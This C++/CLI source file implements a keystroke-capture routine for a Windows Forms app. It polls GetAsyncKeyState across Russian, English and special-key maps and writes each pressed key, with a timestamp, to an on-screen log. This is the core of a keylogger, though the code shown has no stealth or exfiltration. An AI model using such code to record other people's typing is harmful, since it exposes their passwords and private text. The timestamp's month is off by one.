#include "Header.h"
#include <Windows.h>
#include <ctime>

static void printTime(System::Windows::Forms::TextBox^, time_t);

void Key::getKeys(System::Windows::Forms::TextBox^ log){
	if ((int)GetKeyboardLayout(GetCurrentThreadId()) == 68748313) {
		for (std::map<int, char*>::iterator itMap = this->ruVocabulary.begin(); itMap != this->ruVocabulary.end(); itMap++) {
			if (GetAsyncKeyState(itMap->first)) {
				printTime(log, time(0));
				log->AppendText(gcnew System::String(itMap->second) + "\r\n");
			}
		}
	}else {
		for (std::map<int, char*>::iterator itMap = this->enVocabulary.begin(); itMap != this->enVocabulary.end(); itMap++) {
			if (GetAsyncKeyState(itMap->first)) {
				printTime(log, time(0));
				log->AppendText(gcnew System::String(itMap->second) + "\r\n");
			}
		}
	}
	for (std::map<int, char*>::iterator itMap = this->serVocabulary.begin(); itMap != this->serVocabulary.end(); itMap++) {
		if (GetAsyncKeyState(itMap->first)) {
			printTime(log, time(0));
			log->AppendText(gcnew System::String(itMap->second) + "\r\n");
		}
	}
}

static void printTime(System::Windows::Forms::TextBox^ log, time_t t) {
	struct tm * now = localtime(&t);
	log->AppendText("[" + now->tm_mday + "." + now->tm_mon + "." + (now->tm_year + 1900) + " " + now->tm_hour + ":" + now->tm_min + ":" + now->tm_sec + "] ");
}